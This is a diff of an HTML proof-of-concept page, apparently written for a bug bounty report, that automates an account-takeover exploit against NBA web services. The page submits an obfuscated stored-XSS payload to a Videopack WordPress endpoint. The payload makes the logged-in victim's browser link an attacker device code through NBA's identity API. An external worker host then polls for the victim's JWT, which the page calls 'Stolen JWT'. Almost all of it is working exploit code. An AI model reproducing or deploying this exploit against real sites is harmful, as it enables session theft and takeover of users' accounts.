@@ -4,43 +4,21 @@
 <title>NBA rendezvous account-token PoC</title>
 <style>
   body { font: 16px/1.45 system-ui, sans-serif; max-width: 760px; margin: 40px auto; padding: 0 20px; }
-  label, button, textarea, input { display: block; width: 100%; box-sizing: border-box; margin: 10px 0; }
-  input, textarea, button { font: inherit; padding: 10px; }
-  textarea { min-height: 130px; }
-  button { cursor: pointer; }
-  code { overflow-wrap: anywhere; }
+  textarea, button { display: block; width: 100%; box-sizing: border-box; margin: 12px 0; font: inherit; padding: 10px; }
+  textarea { min-height: 160px; overflow-wrap: anywhere; }
   .muted { color: #555; }
   .ok { color: #075; }
+  .error { color: #a00; }
 </style>
 
 <h1>NBA rendezvous account-token PoC</h1>
-<p>This page triggers the confirmed Videopack XSS, links an attacker device to the logged-in controlled NBA ID, and helps display the returned JWT.</p>
-
-<h2>1. Generate attacker code</h2>
-<label>Attacker device ID
-  <input id="device" autocomplete="off">
-</label>
-<p>Run this command, then paste the returned six-character code below:</p>
-<code id="generateCommand"></code>
-<button id="copyCommand" type="button">Copy generation command</button>
-
-<h2>2. Trigger account link</h2>
-<label>Six-character rendezvous code
-  <input id="code" maxlength="6" autocomplete="off">
-</label>
-<button id="trigger" type="button">Trigger Videopack XSS</button>
-<p id="triggerStatus" class="muted"></p>
-
-<h2>3. Retrieve and display JWT</h2>
-<a id="poll" href="#" target="_blank" rel="noopener">Open attacker polling response</a>
-<p class="muted">Copy the JSON response, return here, and paste it below. The page does not store or transmit the pasted value.</p>
-<textarea id="tokenInput" autocomplete="off" spellcheck="false" placeholder="Paste the polling JSON response or JWT"></textarea>
-<button id="showToken" type="button">Alert and copy full JWT</button>
-<p id="tokenStatus" class="muted"></p>
+<p id="status">Starting automatic proof of concept…</p>
+<p class="muted">Use only with a controlled NBA ID. The page creates a device code, triggers the Videopack XSS, polls for the linked account token, then displays and copies the full JWT.</p>
+<textarea id="jwt" hidden readonly aria-label="Stolen JWT"></textarea>
+<button id="copy" hidden type="button">Copy full JWT</button>
 
 <form id="poc" method="post" enctype="multipart/form-data"
-      action="https://videorulebook.nba.com/wp-admin/admin-ajax.php"
-      target="nba_rendezvous_exploit" hidden>
+      action="https://videorulebook.nba.com/wp-admin/admin-ajax.php" hidden>
   <input name="action" value="kgvid_switch_gallery_page">
   <input name="security" value="8df5c8250d">
   <input name="page" value="1">
@@ -59,35 +37,25 @@
 </form>
 
 <script>
-  const device = document.getElementById("device");
-  const code = document.getElementById("code");
-  const generateCommand = document.getElementById("generateCommand");
-  const poll = document.getElementById("poll");
-  const params = new URLSearchParams(location.search);
-
-  device.value = params.get("device") || crypto.randomUUID();
-  code.value = params.get("code") || "";
-
-  function refreshLinks() {
-    const deviceId = encodeURIComponent(device.value.trim());
-    const rendezvousCode = encodeURIComponent(code.value.trim());
-    generateCommand.textContent = `curl -s "https://identity.nba.com/api/v1/devices/${deviceId}/codes"`;
-    poll.href = `https://identity.nba.com/api/v1/devices/${deviceId}/codes/${rendezvousCode}`;
-  }
+  const WORKER = "https://nba-rendezvous-ato-poc.h1-3989880-research.workers.dev";
+  const CLEAN_URL = `${location.origin}${location.pathname}`;
+  const status = document.getElementById("status");
 
   function charCodeExpression(value) {
     return `String.fromCharCode(${Array.from(value, character => character.charCodeAt(0)).join(",")})`;
   }
 
-  function exploitPayload(rendezvousCode) {
-    const endpoint = charCodeExpression("https://identity.nba.com/api/v1/rendezvous");
+  function exploitPayload(code, deviceId) {
+    const identityEndpoint = charCodeExpression("https://identity.nba.com/api/v1/rendezvous");
+    const returnUrl = charCodeExpression(`${CLEAN_URL}#resume=${encodeURIComponent(deviceId)}:${encodeURIComponent(code)}`);
+    const fetchName = charCodeExpression("fetch");
+    const timeoutName = charCodeExpression("setTimeout");
     const post = charCodeExpression("POST");
     const include = charCodeExpression("include");
     const contentType = charCodeExpression("Content-Type");
     const textPlain = charCodeExpression("text/plain");
-    const codeValue = charCodeExpression(rendezvousCode);
-    const fetchName = charCodeExpression("fetch");
-    const handler = `top[${fetchName}](${endpoint},{method:${post},credentials:${include},headers:{[${contentType}]:${textPlain}},body:JSON.stringify({code:${codeValue}})})`;
+    const codeValue = charCodeExpression(code);
+    const handler = `top[${fetchName}](${identityEndpoint},{method:${post},credentials:${include},headers:{[${contentType}]:${textPlain}},body:JSON.stringify({code:${codeValue}})});top[${timeoutName}](()=>top.location=${returnUrl},1500)`;
     return `250\"><details open ontoggle='${handler}'>`;
   }
 
@@ -107,44 +75,69 @@
     return null;
   }
 
-  device.addEventListener("input", refreshLinks);
-  code.addEventListener("input", refreshLinks);
-
-  document.getElementById("copyCommand").addEventListener("click", async () => {
-    await navigator.clipboard.writeText(generateCommand.textContent);
-  });
-
-  document.getElementById("trigger").addEventListener("click", () => {
-    const rendezvousCode = code.value.trim();
-    if (!/^[A-Za-z0-9]{6}$/.test(rendezvousCode)) {
-      document.getElementById("triggerStatus").textContent = "Enter the six-character code first.";
-      return;
-    }
-    document.getElementById("galleryThumb").value = exploitPayload(rendezvousCode);
-    window.open("about:blank", "nba_rendezvous_exploit");
-    document.getElementById("poc").submit();
-    document.getElementById("triggerStatus").className = "ok";
-    document.getElementById("triggerStatus").textContent = "Exploit request opened. Poll the attacker device after it finishes.";
-  });
-
-  document.getElementById("showToken").addEventListener("click", async () => {
-    const input = document.getElementById("tokenInput").value.trim();
-    let jwt = null;
+  async function displayJwt(jwt) {
+    const output = document.getElementById("jwt");
+    const copy = document.getElementById("copy");
+    output.hidden = false;
+    output.value = jwt;
+    copy.hidden = false;
+    copy.onclick = async () => navigator.clipboard.writeText(jwt);
     try {
-      jwt = findJwt(JSON.parse(input));
+      await navigator.clipboard.writeText(jwt);
+      status.textContent = "Account token captured. Full JWT displayed and copied.";
     } catch {
-      jwt = findJwt(input);
+      status.textContent = "Account token captured. Full JWT displayed; use Copy full JWT.";
     }
-    if (!jwt) {
-      document.getElementById("tokenStatus").textContent = "No JWT found in pasted value.";
+    status.className = "ok";
+    alert(jwt);
+  }
+
+  async function poll(deviceId, code) {
+    history.replaceState(null, "", CLEAN_URL);
+    status.textContent = "Account link sent. Waiting for stolen JWT…";
+    for (let attempt = 0; attempt < 60; attempt += 1) {
+      const response = await fetch(`${WORKER}/poll?device=${encodeURIComponent(deviceId)}&code=${encodeURIComponent(code)}`, {
+        cache: "no-store"
+      });
+      if (response.ok) {
+        const body = await response.json();
+        const jwt = findJwt(body);
+        if (jwt) {
+          await displayJwt(jwt);
+          return;
+        }
+      }
+      await new Promise(resolve => setTimeout(resolve, 1000));
+    }
+    throw new Error("No token returned before timeout.");
+  }
+
+  async function start() {
+    const resume = location.hash.match(/^#resume=([^:]+):([A-Za-z0-9]{6})$/);
+    if (resume) {
+      await poll(decodeURIComponent(resume[1]), decodeURIComponent(resume[2]));
       return;
     }
-    await navigator.clipboard.writeText(jwt);
-    document.getElementById("tokenInput").value = "";
-    alert(jwt);
-    document.getElementById("tokenStatus").className = "ok";
-    document.getElementById("tokenStatus").textContent = "Full JWT displayed and copied. Nothing was stored.";
-  });
 
-  refreshLinks();
+    status.textContent = "Creating attacker device code…";
+    const response = await fetch(`${WORKER}/session`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: "{}",
+      cache: "no-store"
+    });
+    if (!response.ok) throw new Error("Device-code generation failed.");
+
+    const session = await response.json();
+    if (!session.deviceId || !session.code) throw new Error("Worker returned an invalid session.");
+
+    status.textContent = "Device code created. Triggering Videopack XSS…";
+    document.getElementById("galleryThumb").value = exploitPayload(session.code, session.deviceId);
+    document.getElementById("poc").submit();
+  }
+
+  start().catch(error => {
+    status.className = "error";
+    status.textContent = error.message;
+  });
 </script>
